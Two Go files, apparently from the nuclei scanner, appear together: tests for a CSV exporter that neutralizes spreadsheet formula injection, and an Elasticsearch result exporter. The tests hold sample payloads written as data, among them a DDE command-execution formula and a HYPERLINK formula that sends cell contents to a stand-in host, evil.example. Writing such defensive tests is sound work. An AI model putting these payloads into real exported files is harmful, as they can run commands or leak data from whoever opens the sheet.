// TestCSVExporterNeutralizesSpreadsheetFormulas covers the second half of the
// escaping problem. encoding/csv stops a value from breaking out of its cell,
// but it does not stop a spreadsheet from evaluating that cell as a formula.
// ExtractedResults in particular is raw response-derived data, so a target can
// choose exactly what lands in it.
func TestCSVExporterNeutralizesSpreadsheetFormulas(t *testing.T) {
	const (
		ddePayload       = `=cmd|'/C calc'!A0`
		hyperlinkPayload = `=HYPERLINK("http://evil.example/log?d="&A1,"click")`
		atPayload        = `@SUM(1+1)`
		plusPayload      = `+1+1`
		tabPayload       = "\t=1+1"
		crPayload        = "\r=1+1"
		safeValue        = "http://127.0.0.1:8080/index.html"
		negativeNumber   = "-1"
	)

	event := &output.ResultEvent{
		TemplateID: ddePayload,
		Type:       "http",
		Info: model.Info{
			Name:           atPayload,
			Description:    plusPayload,
			Reference:      stringslice.NewRawStringSlice([]string{safeValue, hyperlinkPayload}),
			SeverityHolder: severity.Holder{Severity: severity.High},
			Classification: &model.Classification{
				CVSSScore: 9.8,
			},
		},
		Host:             tabPayload,
		Matched:          safeValue,
		MatcherName:      crPayload,
		ExtractedResults: []string{safeValue, ddePayload, negativeNumber, hyperlinkPayload},
		CURLCommand:      ddePayload,
		Timestamp:        time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
	}

	records := export(t, event)
	require.Len(t, records, 2)
	row := records[1]
	require.Len(t, row, len(header))

	// every formula-triggering cell is prefixed with a single apostrophe, and
	// the original value is recoverable by removing exactly that apostrophe
	for _, tc := range []struct {
		column string
		want   string
	}{
		{"template-id", ddePayload},
		{"template-name", atPayload},
		{"description", plusPayload},
		{"host", tabPayload},
		{"matcher-name", crPayload},
		{"curl-command", ddePayload},
	} {
		got := row[column(t, tc.column)]
		require.Equal(t, "'"+tc.want, got, "column %s must be neutralized", tc.column)
		require.Equal(t, tc.want, strings.TrimPrefix(got, "'"), "column %s must stay recoverable", tc.column)
	}

	// values that are not formulas are left byte-for-byte alone, so the export
	// does not become littered with apostrophes
	require.Equal(t, safeValue, row[column(t, "matched-at")])
	require.Equal(t, "high", row[column(t, "severity")])
	// a numeric cell stays numeric and sortable rather than becoming text
	require.Equal(t, "9.8", row[column(t, "cvss-score")])

	// multi-value cells are neutralized per element, not just at the start of
	// the cell, because consumers split these cells back apart
	require.Equal(t,
		[]string{safeValue, "'" + ddePayload, negativeNumber, "'" + hyperlinkPayload},
		strings.Split(row[column(t, "extracted-results")], "\n"))
	require.Equal(t,
		[]string{safeValue, "'" + hyperlinkPayload},
		strings.Split(row[column(t, "reference")], "\n"))
}

func TestNeutralizeFormula(t *testing.T) {
	for _, tc := range []struct {
		name  string
		input string
		want  string
	}{
		{"empty", "", ""},
		{"plain text", "nuclei", "nuclei"},
		{"url", "http://example.com/a=b", "http://example.com/a=b"},
		{"equals", "=1+1", "'=1+1"},
		{"plus", "+1+1", "'+1+1"},
		{"at", "@SUM(1)", "'@SUM(1)"},
		{"tab", "\t=1+1", "'\t=1+1"},
		{"carriage return", "\r=1+1", "'\r=1+1"},
		{"negative integer stays numeric", "-1", "-1"},
		{"negative float stays numeric", "-1.5", "-1.5"},
		{"positive signed number stays numeric", "+9.8", "+9.8"},
		{"minus leading text is neutralized", "-cmd|'/C calc'!A0", "'-cmd|'/C calc'!A0"},
		{"leading space before trigger", " =1+1", "' =1+1"},
		{"leading spaces and control before trigger", " \x01 @SUM(1)", "' \x01 @SUM(1)"},
		{"leading newline before trigger", "\n=1+1", "'\n=1+1"},
		{"space only", "   ", "   "},
		{"inner trigger is not a trigger", "a=1+1", "a=1+1"},
		{"already neutralized is left alone", "'=1+1", "'=1+1"},
		{"non-ascii leading rune", "é=1+1", "é=1+1"},
		{"exponent number stays numeric", "-1e5", "-1e5"},
		{"leading dot number stays numeric", "-.5", "-.5"},
		{"infinity is not a plain number", "-Inf", "'-Inf"},
		{"nan is not a plain number", "+NaN", "'+NaN"},
		{"hex float is not a plain number", "-0x1p-2", "'-0x1p-2"},
		{"number with trailing text", "-1+cmd", "'-1+cmd"},
		{"number with trailing newline", "-1\n", "'-1\n"},
		{"lone sign", "-", "'-"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			require.Equal(t, tc.want, neutralizeFormula(tc.input))
		})
	}
}

package es

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/pkg/errors"

	"github.com/projectdiscovery/nuclei/v3/pkg/output"
	"github.com/projectdiscovery/nuclei/v3/pkg/protocols/common/protocolstate"
	"github.com/projectdiscovery/nuclei/v3/pkg/utils/json"
	"github.com/projectdiscovery/retryablehttp-go"
	"github.com/projectdiscovery/useragent"
)

// Options contains necessary options required for elasticsearch communication
type Options struct {
	// Host is the hostname of the elasticsearch instance
	Host string `yaml:"host" validate:"required_without=IP"`
	// IP for elasticsearch instance
	IP string `yaml:"ip" validate:"required_without=Host,omitempty,ip"`
	// Port is the port of elasticsearch instance
	Port int `yaml:"port" validate:"gte=0,lte=65535"`
	// SSL (optional) enables ssl for elasticsearch connection
	SSL bool `yaml:"ssl"`
	// SSLVerification (optional) disables SSL verification for elasticsearch
	SSLVerification bool `yaml:"ssl-verification"`
	// Username for the elasticsearch instance
	Username string `yaml:"username"  validate:"required"`
	// Password is the password for elasticsearch instance
	Password string `yaml:"password"  validate:"required"`
	// IndexName is the name of the elasticsearch index
	IndexName string `yaml:"index-name"  validate:"required"`

	HttpClient  *retryablehttp.Client `yaml:"-"`
	ExecutionId string                `yaml:"-"`
}

type data struct {
	Event     *output.ResultEvent `json:"event"`
	Timestamp string              `json:"@timestamp"`
}

// Exporter type for elasticsearch
type Exporter struct {
	url            string
	authentication string
	elasticsearch  *http.Client
}

// New creates and returns a new exporter for elasticsearch
func New(option *Options) (*Exporter, error) {
	var ei *Exporter

	dialers := protocolstate.GetDialersWithId(option.ExecutionId)
	if dialers == nil {
		return nil, fmt.Errorf("dialers not initialized for %s", option.ExecutionId)
	}

	var client *http.Client
	if option.HttpClient != nil {
		client = option.HttpClient.HTTPClient
	} else {
		client = &http.Client{
			Timeout: 5 * time.Second,
			Transport: &http.Transport{
				MaxIdleConns:        10,
				MaxIdleConnsPerHost: 10,
				// No DialTLSContext: fastdialer DialTLS ignores TLSClientConfig and
				// skips verification; net/http does the handshake with TLSClientConfig.
				DialContext:     dialers.Fastdialer.Dial,
				TLSClientConfig: &tls.Config{InsecureSkipVerify: option.SSLVerification},
			},
		}
	}

	// preparing url for elasticsearch
	scheme := "http://"
	if option.SSL {
		scheme = "https://"
	}
	// if authentication is required
	var authentication string
	if len(option.Username) > 0 && len(option.Password) > 0 {
		auth := base64.StdEncoding.EncodeToString([]byte(option.Username + ":" + option.Password))
		auth = "Basic " + auth
		authentication = auth
	}
	var addr string
	if option.Host != "" {
		addr = option.Host
	} else {
		addr = option.IP
	}
	if option.Port != 0 {
		addr += fmt.Sprintf(":%d", option.Port)
	}
	url := fmt.Sprintf("%s%s/%s/_doc", scheme, addr, option.IndexName)

	ei = &Exporter{
		url:            url,
		authentication: authentication,
		elasticsearch:  client,
	}
	return ei, nil
}

// Export exports a passed result event to elasticsearch
func (exporter *Exporter) Export(event *output.ResultEvent) error {
	// creating a request
	req, err := http.NewRequest(http.MethodPost, exporter.url, nil)
	if err != nil {
		return errors.Wrap(err, "could not make request")
	}
	if len(exporter.authentication) > 0 {
		req.Header.Add("Authorization", exporter.authentication)
	}
	userAgent := useragent.PickRandom()
	req.Header.Set("User-Agent", userAgent.Raw)
	req.Header.Add("Content-Type", "application/json")

	d := data{
		Event:     event,
		Timestamp: time.Now().Format(time.RFC3339),
	}
	b, err := json.Marshal(&d)
	if err != nil {
		return err
	}
	req.Body = io.NopCloser(bytes.NewReader(b))

	res, err := exporter.elasticsearch.Do(req)
	if err != nil {
		return err
	}
	defer func() {
		_ = res.Body.Close()
	}()

	b, err = io.ReadAll(res.Body)
	if err != nil {
		return errors.New(err.Error() + "error thrown by elasticsearch " + string(b))
	}

	if res.StatusCode >= 300 {
		return errors.New("elasticsearch responded with an error: " + string(b))
	}
	return nil
}

// Close closes the exporter after operation
func (exporter *Exporter) Close() error {
	return nil
}

